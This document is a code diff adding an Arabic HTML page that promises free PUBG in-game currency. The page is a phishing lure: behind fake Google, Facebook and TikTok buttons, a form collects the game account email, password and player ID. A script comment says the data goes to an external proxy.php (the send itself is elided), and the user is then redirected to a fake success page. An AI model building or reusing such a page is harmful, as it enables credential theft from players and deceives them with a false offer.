@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>شحن ببجي مجانا</title>
+  </head>
+<body>
+
+<canvas id="snow"></canvas>
+
+<div id="login" class="container">
+  <h1>شحن ببجي مجانا</h1>
+  <button class="btn" onclick="showForm()">Google</button>
+  <button class="btn" onclick="showForm()">Facebook</button>
+  <button class="btn" onclick="showForm()">TikTok</button>
+</div>
+
+<div id="form" class="container" style="display: none;">
+  <h1>سجل دخولك لشحن الشدات 🎁</h1>
+  <form id="pubgForm">
+    <label>بريد الكتروني حساب اللعبة:</label>
+    <input type="email" name="email" required />
+    <label>كلمة سر حساب اللعبة:</label>
+    <input type="password" name="password" required />
+    <label>ايدي اللاعب:</label>
+    <input type="text" name="player_id" required />
+    <label>كمية الشدات:</label>
+    <select name="amount" required>
+      <option value="1000">1000 شدة</option>
+      </select>
+    <button type="submit" class="buy-btn">شحن</button>
+  </form>
+</div>
+
+<script>
+  // الكود يقوم بالتقاط المدخلات وإرسالها للسيرفر الخارجي proxy.php
+  form.addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const data = new FormData(this);
+    // ... إرسال البيانات عبر fetch ...
+    // ثم تحويل المستخدم لصفحة نجاح وهمية
+    window.location.href = "https://issol.free.nf/success/ok.html?i=1";
+  });
+</script>
+</body>
+</html>
